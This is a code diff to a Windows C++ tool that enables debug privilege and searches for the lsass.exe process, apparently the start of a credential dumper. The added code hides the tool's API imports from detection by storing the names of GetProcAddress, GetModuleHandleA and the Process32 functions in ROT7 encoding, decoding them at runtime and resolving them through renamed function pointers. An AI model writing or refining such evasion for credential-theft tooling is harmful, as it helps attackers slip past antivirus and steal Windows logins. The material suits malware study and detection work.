@@ -14,6 +14,37 @@ using namespace std;
 
 DWORD ignored;
 
+
+char enc_func[4][20] = {
+	"NlaWyvjHkkylzz", // GetProcAddress ROT7
+	"NlaTvkbslOhukslH", // GetModuleHandleA
+	"Wyvjlzz32MpyzaD", // Process32FirstW
+	"Wyvjlzz32UleaD" // Process32NextW
+};
+
+void dec_r7(char* val) {
+	size_t i;
+	int base;
+	for (i=0; i < strlen(val); i++) {
+		if (val[i] <= 57) {
+			continue;	// numbers not processed
+		}
+		else if (val[i] <= 90) {
+			base = 65;
+		}
+		else {
+			base = 97;
+		}
+		if (((int) val[i] - base - 7) < 0) {
+			val[i] = (val[i] + 19);
+		}
+		else {
+			val[i] = val[i] - 7;
+		}
+	}
+	//printf("decoded value: %s", val);
+}
+
 // Utility function to convert an UNICODE_STRING to a char*
 HRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA) {
 	ULONG cbAnsi, cCharacters;
@@ -43,16 +74,16 @@ HRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA) {
 
 namespace dynamic {
 	using GetModuleHandlePrototype = HMODULE(WINAPI*)(LPCSTR);
-	GetModuleHandlePrototype GetModuleHandle;
+	GetModuleHandlePrototype GMH;
 
 	using GetProcAddressPrototype = FARPROC(WINAPI*)(HMODULE, LPCSTR);
-	GetProcAddressPrototype GetProcAddress;
+	GetProcAddressPrototype GPA;
 
 	using Process32FirstPrototype = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32);
-	Process32FirstPrototype Process32First;
+	Process32FirstPrototype P32F;
 
 	using Process32NextPrototype = Process32FirstPrototype;
-	Process32NextPrototype Process32Next;
+	Process32NextPrototype P32N;
 
 	ADDR find_dll_export(ADDR dll_base, const char* export_name) {
 		// Read the DLL PE header and NT header
@@ -112,12 +143,21 @@ namespace dynamic {
 	}
 
 	void resolve_imports(void) {
+		/* 'decrypt' function names*/
+		int rows = sizeof enc_func / sizeof enc_func[0];
+		for (int i = 0; i < rows; i++) {
+			dec_r7(enc_func[i]);
+			//printf("decode string: %s\n", enc_func[i]);
+		}
+
 		ADDR kernel32_base = find_dll_base("KERNEL32.DLL");
+		dynamic::GPA = (GetProcAddressPrototype)find_dll_export(kernel32_base, enc_func[0]);
+		dynamic::GMH = (GetModuleHandlePrototype)find_dll_export(kernel32_base, enc_func[1]);
 
-		#define _import(_name, _type) ((_type) dynamic::GetProcAddress(dynamic::GetModuleHandle("kernel32.dll"), _name))
+		#define _import(_name, _type) ((_type) dynamic::GPA(dynamic::GMH("kernel32.dll"), _name))
 
-		dynamic::Process32First = _import("Process32FirstW", Process32FirstPrototype); // "obfuscate string"
-		dynamic::Process32Next = _import("Process32NextW", Process32NextPrototype);
+		dynamic::P32F = _import(enc_func[2], Process32FirstPrototype);
+		dynamic::P32N = _import(enc_func[3], Process32NextPrototype);
 	}
 }
 
@@ -151,13 +191,15 @@ int main() {
 	processEntry.dwSize = sizeof(PROCESSENTRY32);
 	LPCWSTR processName = L"";
 
+	dynamic::resolve_imports();
+
 	if (!EnableTokenPrivilege(SE_DEBUG_NAME)) {
 		return -1;
 	}
 
-	if (Process32First(snapshot, &processEntry)) {
+	if (dynamic::P32F(snapshot, &processEntry)) {
 		while (_wcsicmp(processName, L"lsass.exe") != 0) {
-			Process32Next(snapshot, &processEntry);
+			dynamic::P32N(snapshot, &processEntry);
 			processName = processEntry.szExeFile;
 			lsassPID = processEntry.th32ProcessID;
 		}
